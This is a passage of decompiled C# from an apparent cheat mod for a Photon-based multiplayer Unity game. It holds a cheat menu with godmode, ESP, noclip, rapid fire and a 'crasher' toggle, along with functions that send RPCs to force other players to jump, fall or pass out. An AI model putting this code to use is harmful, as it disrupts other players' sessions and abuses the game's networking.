					if (view != null && view.Owner != null && view.Owner.NickName == playerName && !PhotonNetwork.IsMasterClient)
					{
						Player masterClient = PhotonNetwork.MasterClient;
						if (playerName != ((masterClient != null) ? masterClient.NickName : null))
						{
							return true;
						}
					}
				}
				catch
				{
				}
			}
			return false;
		}

		private static void DetectCheater(string playerName, string reason)
		{
			if (!CheatConfig.DetectedCheaters.ContainsKey(playerName))
			{
				CheatConfig.DetectedCheaters[playerName] = true;
				lastDetectionTime[playerName] = Time.time;
				Debug.LogWarning((object)("[CheaterDetection] CHEATER DETECTED: " + playerName + " - " + reason));
			}
		}

		public static void Update()
		{
			if (!CheatConfig.CheaterDetectionEnabled)
			{
				return;
			}
			try
			{
				foreach (string item in CheatConfig.DetectedCheaters.Keys.ToList())
				{
					if (GUI.playerDict == null || !GUI.playerDict.ContainsKey(item))
					{
						CheatConfig.DetectedCheaters.Remove(item);
						playerRPCCounts.Remove(item);
						playerRPCTimestamps.Remove(item);
						playerLastRPCData.Remove(item);
						lastDetectionTime.Remove(item);
					}
				}
			}
			catch
			{
			}
		}
	}
	public class Utils : MonoBehaviour
	{
		public static List<Character> GetTargets()
		{
			List<Character> list = new List<Character>();
			if (Character.AllCharacters != null)
			{
				foreach (Character allCharacter in Character.AllCharacters)
				{
					if (!(allCharacter == null) && !((Object)(object)allCharacter == (Object)(object)Character.localCharacter) && !((Object)(object)allCharacter.photonView == (Object)null) && !allCharacter.photonView.IsMine)
					{
						bool flag = allCharacter.player != null;
						if (!flag)
						{
							GameObject gameObject = allCharacter.gameObject;
							flag = (Object)(object)((gameObject != null) ? gameObject.GetComponent<Player>() : null) != (Object)null;
						}
						if (flag && !(allCharacter.data == null) && !allCharacter.data.dead)
						{
							list.Add(allCharacter);
						}
					}
				}
			}
			return list;
		}
	}
	public class GUI : MonoBehaviour
	{
		private sealed class <InitializeTestDummy>d__232 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public GameObject dummy;

			public Vector3 spawnPos;

			private Character <charComponent>5__2;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <InitializeTestDummy>d__232(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<charComponent>5__2 = null;
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<>2__current = null;
					<>1__state = 1;
					return true;
				case 1:
				{
					<>1__state = -1;
					<charComponent>5__2 = null;
					bool flag = false;
					try
					{
						<charComponent>5__2 = dummy.GetComponent<Character>();
						if ((Object)(object)<charComponent>5__2 == (Object)null)
						{
							<charComponent>5__2 = dummy.GetComponentInChildren<Character>();
						}
						if ((Object)(object)<charComponent>5__2 == (Object)null)
						{
							Debug.LogError((object)"[GUI] Test dummy has no Character component");
							flag = true;
						}
						else
						{
							Debug.Log((object)"[GUI] Found Character component on test dummy");
							FieldInfo field2 = typeof(Character).GetField("isBot", BindingFlags.Instance | BindingFlags.Public);
							if (field2 != null)
							{
								field2.SetValue(<charComponent>5__2, true);
								Debug.Log((object)"[GUI] Set test dummy as bot");
							}
							PhotonView val = dummy.GetComponent<PhotonView>();
							if (val == null)
							{
								val = dummy.GetComponentInChildren<PhotonView>();
							}
							if (val != null && !val.IsMine && PhotonNetwork.IsMasterClient)
							{
								val.TransferOwnership(PhotonNetwork.MasterClient);
							}
							if ((Object)(object)<charComponent>5__2.data != (Object)null)
							{
								<charComponent>5__2.data.dead = false;
								<charComponent>5__2.data.passedOut = false;
								<charComponent>5__2.data.fullyPassedOut = false;
							}
						}
					}
					catch (Exception ex2)
					{
						Debug.LogError((object)("[GUI] Failed to initialize test dummy (first phase): " + ex2.Message + "\n" + ex2.StackTrace));
						flag = true;
					}
					if (flag || (Object)(object)<charComponent>5__2 == (Object)null)
					{
						return false;
					}
					<>2__current = null;
					<>1__state = 2;
					return true;
				}
				case 2:
					<>1__state = -1;
					if ((Object)(object)<charComponent>5__2 == (Object)null)
					{
						return false;
					}
					try
					{
						if ((Object)(object)<charComponent>5__2.input != (Object)null)
						{
							FieldInfo field = typeof(CharacterInput).GetField("itemSwitchBlocked", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
							if (field != null)
							{
								field.SetValue(<charComponent>5__2.input, true);
							}
						}
						if (!CheatConfig.SpawnedEntities.Contains(dummy))
						{
							CheatConfig.SpawnedEntities.Add(dummy);
						}
						Debug.Log((object)$"[GUI] Successfully initialized test dummy (bot) at {spawnPos}");
					}
					catch (Exception ex)
					{
						Debug.LogError((object)("[GUI] Failed to initialize test dummy (second phase): " + ex.Message + "\n" + ex.StackTrace));
					}
					return false;
				}
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}
		private sealed class <ResetJumpInput>d__215 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public Character character;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <ResetJumpInput>d__215(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<>2__current = null;
					<>1__state = 1;
					return true;
				case 1:
					<>1__state = -1;
					if (character != null && character.input != null)
					{
						character.input.jumpIsPressed = false;
					}
					return false;
				}
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}

		public static Rect GUIRect = new Rect(50f, 50f, 1000f, 850f);

		public static int selected_tab = 0;

		public static string[] tabnames = new string[6] { "Self Options", "World", "Visuals", "Players", "Misc", "Settings" };

		public static GUIStyle windowStyle;

		public static GUIStyle buttonStyle;

		public static GUIStyle toggleStyle;

		public static GUIStyle labelStyle;

		public static GUIStyle headerStyle;

		public static GUIStyle sectionHeaderStyle;

		public static GUIStyle boxStyle;

		public static GUIStyle textFieldStyle;

		public static GUIStyle foldoutStyle;

		public static Vector2 itemScrollPos = Vector2.zero;

		public static Vector2 visualScrollPos = Vector2.zero;

		public static Vector2 movementScrollPos = Vector2.zero;

		public static Vector2 playersScrollPos = Vector2.zero;

		public static Vector2 networkScrollPos = Vector2.zero;

		public static Dictionary<GameObject, bool> controlledEntities = new Dictionary<GameObject, bool>();

		public static Dictionary<GameObject, bool> followPlayerEntities = new Dictionary<GameObject, bool>();

		public static Dictionary<GameObject, Vector3> targetPositions = new Dictionary<GameObject, Vector3>();

		public static string lobbyIDInput = "";

		public static string playerSteamIDInput = "";

		public static string usernameSearchInput = "";

		public static Vector2 searchResultsScrollPos = Vector2.zero;

		public static Vector2 playerScrollPos;

		public static Vector2 itemPlayerScrollPos;

		public static int selectedPlayerIndex;

		public static int selectedItemIndex;

		public static int selectedInventorySlotIndex = -1;

		public static Vector2 inventoryScrollPos = Vector2.zero;

		public static int selectedWorldItemIndex = -1;

		public static Vector2 worldItemsScrollPos = Vector2.zero;

		private static Vector2 settingsScrollPos = Vector2.zero;

		private static string hotkeyEditingFeature = null;

		private static float lastHotkeyEditTime = 0f;

		public static bool godmode
		{
			get
			{
				return CheatConfig.Godmode;
			}
			set
			{
				CheatConfig.Godmode = value;
			}
		}

		public static bool clearStatuses
		{
			get
			{
				return CheatConfig.ClearStatuses;
			}
			set
			{
				CheatConfig.ClearStatuses = value;
			}
		}

		public static bool infiniteammo
		{
			get
			{
				return CheatConfig.InfiniteAmmo;
			}
			set
			{
				CheatConfig.InfiniteAmmo = value;
			}
		}

		public static bool randomoutfits
		{
			get
			{
				return CheatConfig.RandomOutfits;
			}
			set
			{
				CheatConfig.RandomOutfits = value;
			}
		}

		public static bool setfieldofview
		{
			get
			{
				return CheatConfig.SetFieldOfView;
			}
			set
			{
				CheatConfig.SetFieldOfView = value;
			}
		}

		public static bool rapidfire
		{
			get
			{
				return CheatConfig.RapidFire;
			}
			set
			{
				CheatConfig.RapidFire = value;
			}
		}

		public static bool Unlockall
		{
			get
			{
				return CheatConfig.UnlockAll;
			}
			set
			{
				CheatConfig.UnlockAll = value;
			}
		}

		public static bool BingbongSpam
		{
			get
			{
				return CheatConfig.BingBongSpam;
			}
			set
			{
				CheatConfig.BingBongSpam = value;
			}
		}

		public static int rapidcooldown
		{
			get
			{
				return CheatConfig.RapidCooldown;
			}
			set
			{
				CheatConfig.RapidCooldown = value;
			}
		}

		public static float fireratecooldown
		{
			get
			{
				return CheatConfig.FireRateCooldown;
			}
			set
			{
				CheatConfig.FireRateCooldown = value;
			}
		}

		public static float fieldofview
		{
			get
			{
				return CheatConfig.FieldOfView;
			}
			set
			{
				CheatConfig.FieldOfView = value;
			}
		}

		public static bool crasher
		{
			get
			{
				return CheatConfig.Crasher;
			}
			set
			{
				CheatConfig.Crasher = value;
			}
		}

		public static bool boxesp
		{
			get
			{
				return CheatConfig.BoxESP;
			}
			set
			{
				CheatConfig.BoxESP = value;
			}
		}

		public static bool boxfix
		{
			get
			{
				return CheatConfig.BoxFix;
			}
			set
			{
				CheatConfig.BoxFix = value;
			}
		}

		public static bool skeletonESP
		{
			get
			{
				return CheatConfig.SkeletonESP;
			}
			set
			{
				CheatConfig.SkeletonESP = value;
			}
		}

		public static bool nameESP
		{
			get
			{
				return CheatConfig.NameESP;
			}
			set
			{
				CheatConfig.NameESP = value;
			}
		}

		public static bool entityBoxESP
		{
			get
			{
				return CheatConfig.EntityBoxESP;
			}
			set
			{
				CheatConfig.EntityBoxESP = value;
			}
		}

		public static bool entityNameESP
		{
			get
			{
				return CheatConfig.EntityNameESP;
			}
			set
			{
				CheatConfig.EntityNameESP = value;
			}
		}

		public static bool entitySkeletonESP
		{
			get
			{
				return CheatConfig.EntitySkeletonESP;
			}
			set
			{
				CheatConfig.EntitySkeletonESP = value;
			}
		}

		public static bool entityAIStateESP
		{
			get
			{
				return CheatConfig.EntityAIStateESP;
			}
			set
			{
				CheatConfig.EntityAIStateESP = value;
			}
		}

		public static bool speed
		{
			get
			{
				return CheatConfig.Speed;
			}
			set
			{
				CheatConfig.Speed = value;
			}
		}

		public static float speedmultiply
		{
			get
			{
				return CheatConfig.SpeedMultiply;
			}
			set
			{
				CheatConfig.SpeedMultiply = value;
			}
		}

		public static bool flyMode
		{
			get
			{
				return CheatConfig.FlyMode;
			}
			set
			{
				CheatConfig.FlyMode = value;
			}
		}

		public static bool noClip
		{
			get
			{
				return CheatConfig.NoClip;
			}
			set
			{
				CheatConfig.NoClip = value;
			}
		}

		public static bool noFallDamage
		{
			get
			{
				return CheatConfig.NoFallDamage;
			}
			set
			{
				CheatConfig.NoFallDamage = value;
			}
		}

		public static bool superJump
		{
			get
			{
				return CheatConfig.SuperJump;
			}
			set
			{
				CheatConfig.SuperJump = value;
			}
		}

		public static float jumpMultiplier
		{
			get
			{
				return CheatConfig.JumpMultiplier;
			}
			set
			{
				CheatConfig.JumpMultiplier = value;
			}
		}

		public static float climbingSpeedMultiplier
		{
			get
			{
				return CheatConfig.ClimbingSpeedMultiplier;
			}
			set
			{
				CheatConfig.ClimbingSpeedMultiplier = value;
			}
		}

		public static float fallDamagePercent
		{
			get
			{
				return CheatConfig.FallDamagePercent;
			}
			set
			{
				CheatConfig.FallDamagePercent = value;
			}
		}

		public static bool reduceStaminaConsumption
		{
			get
			{
				return CheatConfig.ReduceStaminaConsumption;
			}
			set
			{
				CheatConfig.ReduceStaminaConsumption = value;
			}
		}

		public static float staminaConsumptionPercent
		{
			get
			{
				return CheatConfig.StaminaConsumptionPercent;
			}
			set
			{
				CheatConfig.StaminaConsumptionPercent = value;
			}
		}

		public static string itemFilterText
		{
			get
			{
				return CheatConfig.ItemFilterText;
			}
			set
			{
				CheatConfig.ItemFilterText = value;
			}
		}

		public static bool itemDropdownOpen
		{
			get
			{
				return CheatConfig.ItemDropdownOpen;
			}
			set
			{
				CheatConfig.ItemDropdownOpen = value;
			}
		}

		public static Vector2 itemDropdownScrollPos
		{
			get
			{
				return CheatConfig.ItemDropdownScrollPos;
			}
			set
			{
				CheatConfig.ItemDropdownScrollPos = value;
			}
		}

		public static string entityFilterText
		{
			get
			{
				return CheatConfig.EntityFilterText;
			}
			set
			{
				CheatConfig.EntityFilterText = value;
			}
		}

		public static bool entityDropdownOpen
		{
			get
			{
				return CheatConfig.EntityDropdownOpen;
			}
			set
			{
				CheatConfig.EntityDropdownOpen = value;
			}
		}

		public static Vector2 entityDropdownScrollPos
		{
			get
			{
				return CheatConfig.EntityDropdownScrollPos;
			}
			set
			{
				CheatConfig.EntityDropdownScrollPos = value;
			}
		}

		public static Vector2 entityManagerScrollPos
		{
			get
			{
				return CheatConfig.EntityManagerScrollPos;
			}
			set
			{
				CheatConfig.EntityManagerScrollPos = value;
			}
		}

		public static int selectedEntityIndex
		{
			get
			{
				return CheatConfig.SelectedEntityIndex;
			}
			set
			{
				CheatConfig.SelectedEntityIndex = value;
			}
		}

		public static GameObject currentlyControlledEntity
		{
			get
			{
				return CheatConfig.CurrentlyControlledEntity;
			}
			set
			{
				CheatConfig.CurrentlyControlledEntity = value;
			}
		}

		public static float entityControlSpeed
		{
			get
			{
				return CheatConfig.EntityControlSpeed;
			}
			set
			{
				CheatConfig.EntityControlSpeed = value;
			}
		}

		public static float entityFollowDistance
		{
			get
			{
				return CheatConfig.EntityFollowDistance;
			}
			set
			{
				CheatConfig.EntityFollowDistance = value;
			}
		}

		private static string[] filteredItems
		{
			get
			{
				return CheatConfig.FilteredItems;
			}
			set
			{
				CheatConfig.FilteredItems = value;
			}
		}

		private static string[] filteredEntities
		{
			get
			{
				return CheatConfig.FilteredEntities;
			}
			set
			{
				CheatConfig.FilteredEntities = value;
			}
		}

		private static string lastSpawnMessage
		{
			get
			{
				return CheatConfig.LastSpawnMessage;
			}
			set
			{
				CheatConfig.LastSpawnMessage = value;
			}
		}

		private static float lastSpawnMessageTime
		{
			get
			{
				return CheatConfig.LastSpawnMessageTime;
			}
			set
			{
				CheatConfig.LastSpawnMessageTime = value;
			}
		}

		private static string[] availableEntities
		{
			get
			{
				return CheatConfig.AvailableEntities;
			}
			set
			{
				CheatConfig.AvailableEntities = value;
			}
		}

		private static bool entitiesInitialized
		{
			get
			{
				return CheatConfig.EntitiesInitialized;
			}
			set
			{
				CheatConfig.EntitiesInitialized = value;
			}
		}

		public static List<GameObject> spawnedEntities => CheatConfig.SpawnedEntities;

		public static Dictionary<string, Character> playerDict
		{
			get
			{
				return CheatConfig.PlayerDict;
			}
			set
			{
				CheatConfig.PlayerDict = value;
			}
		}

		public static string localPlayerName
		{
			get
			{
				return CheatConfig.LocalPlayerName;
			}
			set
			{
				CheatConfig.LocalPlayerName = value;
			}
		}

		public static string[] items
		{
			get
			{
				return CheatConfig.Items;
			}
			set
			{
				CheatConfig.Items = value;
			}
		}

		private static float GetScrollViewHeight()
		{
			return Mathf.Max((GUIRect).height - 140f, 500f);
		}

		private static string TruncateForDisplay(string text, int maxLength = 64)
		{
			if (string.IsNullOrEmpty(text))
			{
				return text;
			}
			if (text.Length <= maxLength)
			{
				return text;
			}
			return text.Substring(0, maxLength - 3) + "...";
		}

		public static void InitializeEntities()
		{
			ItemSpawning.InitializeEntities();
		}

		private static void SpawnItem(string itemName, Character targetPlayer = null)
		{
			ItemSpawning.SpawnItem(itemName, targetPlayer);
		}

		public static void TeleportTo(Vector3 position, bool poof = true)
		{
			if (!(Character.localCharacter == null) && !((Object)(object)Character.localCharacter.photonView == (Object)null))
			{
				Character.localCharacter.photonView.RPC("WarpPlayerRPC", RpcTarget.All, new object[2] { position, poof });
			}
		}

		public static void MakeEveryoneJump()
		{
			Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
			foreach (Character val in array)
			{
				if (val != null && (Object)(object)val.photonView != (Object)null && !val.photonView.IsMine)
				{
					val.photonView.RPC("JumpRpc", RpcTarget.All, new object[1] { true });
				}
			}
			Debug.Log((object)"[Cheat] Made all other players jump!");
		}

		public static void MakeAllFall()
		{
			foreach (Character allCharacter in Character.AllCharacters)
			{
				if (!allCharacter.photonView.IsMine)
				{
					allCharacter.refs.view.RPC("RPCA_Fall", RpcTarget.All, new object[2] { allCharacter, 5 });
				}
			}
			Debug.Log((object)"[Cheat] Made all other players Fall!");
		}

		public static void MakeAllPassout()
		{
			Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
			foreach (Character val in array)
			{
				if (val != null && (Object)(object)val.photonView != (Object)null)
				{
					val.refs.view.RPC("RPCA_PassOut", RpcTarget.All, new object[2] { val, 5 });
				}
			}
			Debug.Log((object)"[Cheat] Made all other players Fall!");
		}

		public static void RefreshPlayerDict()
		{
			playerDict = new Dictionary<string, Character>();
			try
			{
				MethodInfo method = typeof(PlayerHandler).GetMethod("GetAllPlayers", BindingFlags.Static | BindingFlags.Public);
				if (method != null && method.Invoke(null, null) is IEnumerable enumerable)
				{
					foreach (Player item in enumerable)
					{
						Player val = item;
						if (val != null && val.character != null && (Object)(object)val.photonView != (Object)null)
						{
							string nickName = val.photonView.Owner.NickName;
							if (!string.IsNullOrEmpty(nickName) && !playerDict.ContainsKey(nickName))
							{
								playerDict[nickName] = val.character;
							}
						}
					}
				}
			}
			catch
			{
				Character[] array = Object.FindObjectsByType<Character>(FindObjectsSortMode.None);
				foreach (Character val2 in array)
				{
					if (val2.player != null && (Object)(object)val2.player.photonView != (Object)null)
					{
						string nickName2 = val2.player.photonView.Owner.NickName;
						if (!string.IsNullOrEmpty(nickName2) && !playerDict.ContainsKey(nickName2))
						{
							playerDict[nickName2] = val2;
						}
					}
				}
			}
			Debug.Log((object)("Refreshed playerDict. Players found: " + playerDict.Count));
		}

		public static void CreatePlayersVerticalSelect()
		{
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			GUILayout.Label("Players", sectionHeaderStyle, Array.Empty<GUILayoutOption>());
			if (GUILayout.Button("Refresh", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(90f),
				GUILayout.Height(32f)
			}))
			{
				RefreshPlayerDict();
			}
			GUILayout.EndHorizontal();
			if (playerDict == null || playerDict.Count == 0)
			{
				RefreshPlayerDict();
			}
			string[] array = playerDict.Keys.ToArray();
			if (array.Length == 0)
			{
				GUILayout.Label("No players found", labelStyle, Array.Empty<GUILayoutOption>());
				return;
			}
			if (selectedPlayerIndex < 0 || selectedPlayerIndex >= array.Length)
			{
				selectedPlayerIndex = 0;
			}
			string[] array2 = new string[array.Length];
			for (int i = 0; i < array.Length; i++)
			{
				string text = array[i];
				Character val = playerDict[text];
				bool flag = false;
				if (val != null && (Object)(object)val.photonView != (Object)null && val.photonView.Owner != null)
				{
					flag = val.photonView.Owner.IsMasterClient;
				}
				string text2 = TruncateForDisplay(text);
				array2[i] = (flag ? (text2 + " [HOST]") : text2);
			}
			GUIStyle val2 = new GUIStyle(buttonStyle);
			val2.padding = new RectOffset(12, 12, 8, 8);
			val2.normal.textColor = Color.white;
			val2.hover.textColor = Color.white;
			val2.active.textColor = Color.white;
			val2.focused.textColor = Color.white;
			val2.onNormal.textColor = Color.white;
			val2.onHover.textColor = Color.white;
			val2.onActive.textColor = Color.white;
			val2.onFocused.textColor = Color.white;
			float num = 36f;
			selectedPlayerIndex = GUILayout.SelectionGrid(selectedPlayerIndex, array2, 1, val2, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(num * (float)array.Length) });
			GUILayout.Space(4f);
			if (array.Length != 0 && selectedPlayerIndex >= 0 && selectedPlayerIndex < array.Length)
			{
				string text3 = array[selectedPlayerIndex];
				Character val3 = playerDict[text3];
				bool flag2 = false;
				if (val3 != null && (Object)(object)val3.photonView != (Object)null && val3.photonView.Owner != null)
				{
					flag2 = val3.photonView.Owner.IsMasterClient;
				}
				string text4 = TruncateForDisplay(text3);
				string text5 = (flag2 ? (text4 + " [HOST]") : text4);
				GUILayout.Label("Selected: " + text5, new GUIStyle(labelStyle)
				{
					fontStyle = FontStyle.Bold
				}, Array.Empty<GUILayoutOption>());
			}
		}

		public static void CreateItemsVerticalSelect()
		{
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			GUILayout.Label("Filter:", labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
			if (textFieldStyle != null)
			{
				itemFilterText = GUILayout.TextField(itemFilterText, textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) });
			}
			else
			{
				itemFilterText = GUILayout.TextField(itemFilterText, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) });
			}
			if (GUILayout.Button("Clear", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(80f),
				GUILayout.Height(32f)
			}))
			{
				itemFilterText = "";
			}
			if (GUILayout.Button("Refresh", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(90f),
				GUILayout.Height(32f)
			}) && Cheat.instance != null)
			{
				Cheat.instance.InitializeItems();
				items = CheatConfig.Items;
				if (selectedItemIndex >= items.Length)
				{
					selectedItemIndex = -1;
				}
			}
			GUILayout.EndHorizontal();
			GUILayout.Space(5f);
			if (items != null && items.Length != 0)
			{
				if (string.IsNullOrEmpty(itemFilterText))
				{
					filteredItems = items;
				}
				else
				{
					string filterLower = itemFilterText.ToLower();
					filteredItems = items.Where((string item) => item?.ToLower().Contains(filterLower) ?? false).ToArray();
				}
			}
			else
			{
				filteredItems = new string[0];
			}
			string text = "Select Item...";
			if (items != null && items.Length != 0 && selectedItemIndex >= 0 && selectedItemIndex < items.Length)
			{
				string text2 = items[selectedItemIndex];
				string text3 = TruncateForDisplay(text2, 50);
				text = (filteredItems.Contains(text2) ? text3 : ((filteredItems.Length == 0) ? text3 : (text3 + " (filtered out)")));
			}
			else if (filteredItems.Length == 0 && items != null && items.Length != 0)
			{
				text = "No items match filter";
			}
			else if (items == null || items.Length == 0)
			{
				text = "No items available";
			}
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			if (GUILayout.Button(text + (itemDropdownOpen ? " " : " ?"), buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
			{
				itemDropdownOpen = !itemDropdownOpen;
			}
			if (GUILayout.Button("Refresh", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(90f),
				GUILayout.Height(36f)
			}) && Cheat.instance != null)
			{
				Cheat.instance.InitializeItems();
			}
			GUILayout.EndHorizontal();
			if (itemDropdownOpen)
			{
				GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
				itemDropdownScrollPos = GUILayout.BeginScrollView(itemDropdownScrollPos, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(200f) });
				if (filteredItems.Length == 0)
				{
					GUILayout.Label("No items found", labelStyle, Array.Empty<GUILayoutOption>());
				}
				else
				{
					for (int i = 0; i < filteredItems.Length; i++)
					{
						object obj;
						if (selectedItemIndex < 0 || selectedItemIndex >= items.Length || !(items[selectedItemIndex] == filteredItems[i]))
						{
							obj = buttonStyle;
						}
						else
						{
							GUIStyle val = new GUIStyle(buttonStyle);
							val.normal.background = buttonStyle.onNormal.background;
							obj = (object)val;
						}
						string text4 = TruncateForDisplay(filteredItems[i], 60);
						GUIStyle val2 = new GUIStyle((GUIStyle)obj)
						{
							fontSize = 12,
							wordWrap = false
						};
						if (GUILayout.Button(text4, val2, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
						{
							int num = Array.IndexOf(items, filteredItems[i]);
							if (num >= 0)
							{
								selectedItemIndex = num;
							}
							itemDropdownOpen = false;
						}
					}
				}
				GUILayout.EndScrollView();
				GUILayout.EndVertical();
			}
			GUILayout.Space(4f);
			if (items != null && items.Length != 0 && selectedItemIndex >= 0 && selectedItemIndex < items.Length)
			{
				GUILayout.Label("Selected: " + items[selectedItemIndex], new GUIStyle(labelStyle)
				{
					fontStyle = FontStyle.Bold
				}, Array.Empty<GUILayoutOption>());
			}
		}

		public static void CreateEntityDropdown()
		{
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			GUILayout.Label("Filter:", labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(50f) });
			if (textFieldStyle != null)
			{
				entityFilterText = GUILayout.TextField(entityFilterText, textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) });
			}
			else
			{
				entityFilterText = GUILayout.TextField(entityFilterText, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) });
			}
			if (GUILayout.Button("Clear", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(80f),
				GUILayout.Height(32f)
			}))
			{
				entityFilterText = "";
			}
			if (GUILayout.Button("Refresh", buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
			{
				GUILayout.Width(90f),
				GUILayout.Height(32f)
			}))
			{
				CheatConfig.EntitiesInitialized = false;
				InitializeEntities();
				CheatConfig.LastSpawnMessage = $"Refreshed! Found {CheatConfig.AvailableEntities.Length} entities";
				CheatConfig.LastSpawnMessageTime = Time.time;
			}
			GUILayout.EndHorizontal();
			GUILayout.Space(5f);
			int num = ((CheatConfig.AvailableEntities != null) ? CheatConfig.AvailableEntities.Length : 0);
			if (!CheatConfig.EntitiesInitialized)
			{
				GUILayout.Label("Available entities: Click Refresh to load", new GUIStyle(labelStyle)
				{
					fontSize = 11,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
			}
			else
			{
				GUILayout.Label($"Available entities: {num}", new GUIStyle(labelStyle)
				{
					fontSize = 11
				}, Array.Empty<GUILayoutOption>());
			}
			GUILayout.Space(3f);
			filteredEntities = ItemSpawning.FilterEntities(entityFilterText);
			string text = "Select Entity...";
			text = ((filteredEntities.Length != 0) ? ("Select Entity... (" + filteredEntities.Length + " available)") : ((num <= 0) ? "No entities available" : "No entities match filter"));
			if (GUILayout.Button(text + (entityDropdownOpen ? " " : " ?"), buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
			{
				entityDropdownOpen = !entityDropdownOpen;
			}
			if (entityDropdownOpen)
			{
				GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
				float num2 = Mathf.Min((float)filteredEntities.Length * 22f + 20f, 200f);
				num2 = Mathf.Max(num2, 100f);
				entityDropdownScrollPos = GUILayout.BeginScrollView(entityDropdownScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(num2) });
				if (filteredEntities.Length == 0)
				{
					GUILayout.Label("No entities found", labelStyle, Array.Empty<GUILayoutOption>());
				}
				else
				{
					for (int i = 0; i < filteredEntities.Length; i++)
					{
						if (GUILayout.Button(filteredEntities[i], buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
						{
							SpawnEntity(filteredEntities[i]);
							entityDropdownOpen = false;
						}
					}
				}
				GUILayout.EndScrollView();
				GUILayout.EndVertical();
			}
			string text2 = CheatConfig.LastSpawnMessage;
			float num3 = CheatConfig.LastSpawnMessageTime;
			if (!string.IsNullOrEmpty(text2) && Time.time - num3 < 3f)
			{
				Color color = GUI.color;
				if (text2.Contains("SUCCESS") || text2.Contains("Successfully"))
				{
					GUI.color = Color.green;
				}
				else if (text2.Contains("FAILED") || text2.Contains("ERROR"))
				{
					GUI.color = Color.red;
				}
				else
				{
					GUI.color = Color.yellow;
				}
				GUILayout.Label(text2, new GUIStyle(labelStyle)
				{
					fontSize = 11,
					fontStyle = FontStyle.Bold
				}, Array.Empty<GUILayoutOption>());
				GUI.color = color;
			}
		}

		private static void SpawnEntity(string entityName)
		{
			ItemSpawning.SpawnEntity(entityName);
		}

		public static void CleanupDestroyedEntities()
		{
			EntityManager.CleanupDestroyedEntities();
			foreach (GameObject item in controlledEntities.Keys.Where((GameObject k) => k == null).ToList())
			{
				controlledEntities.Remove(item);
				followPlayerEntities.Remove(item);
				targetPositions.Remove(item);
			}
		}

		public static void InitializeSpawnedEntity(GameObject entity)
		{
			if (entity == null)
			{
				return;
			}
			try
			{
				Debug.Log((object)("[Cheat] Initializing spawned entity: " + ((Object)entity).name));
				entity.SetActive(true);
				Character component = entity.GetComponent<Character>();
				if (component != null)
				{
					((Behaviour)component).enabled = true;
					Debug.Log((object)("[Cheat] Enabled Character component on " + ((Object)entity).name));
					if ((Object)(object)component != (Object)(object)Character.localCharacter && (Object)(object)component.photonView != (Object)null && component.photonView.IsMine)
					{
						try
						{
							component.photonView.TransferOwnership(PhotonNetwork.MasterClient);
							Debug.Log((object)("[Cheat] Transferred ownership of " + ((Object)entity).name + " to master client"));
						}
						catch
						{
							Debug.LogWarning((object)("[Cheat] Could not transfer ownership of " + ((Object)entity).name));
						}
					}
				}
				CharacterMovement component2 = entity.GetComponent<CharacterMovement>();
				if (component2 != null)
				{
					((Behaviour)component2).enabled = true;
					Debug.Log((object)("[Cheat] Enabled CharacterMovement on " + ((Object)entity).name));
				}
				MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
				foreach (MonoBehaviour val in components)
				{
					if (val != null)
					{
						string name = ((object)val).GetType().Name;
